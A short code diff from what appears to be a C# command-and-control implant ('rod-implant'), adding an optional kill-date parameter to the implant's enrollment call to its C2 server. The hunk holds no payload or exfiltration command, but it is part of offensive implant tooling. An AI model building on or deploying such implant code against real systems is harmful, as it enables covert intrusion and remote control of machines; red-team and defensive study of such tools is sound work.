@@ -175,7 +175,9 @@ internal static class ImplantApp
             {
                 log.WriteLine($"rod-implant: enrolling at {enrollUrl}");
                 return await C2.EnrollAsync(
-                    enrollUrl, config.StagerToken, parentImplantId: null, privateKey, serverCAs, config.Transport, host: host, cancellationToken: cancellationToken);
+                    enrollUrl, config.StagerToken, parentImplantId: null, privateKey, serverCAs, config.Transport, host: host,
+                    killDate: config.HasKillDate ? config.KillDate.ToString("O") : null,
+                    cancellationToken: cancellationToken);
             }
             catch (C2.EnrollRejectedException)
             {
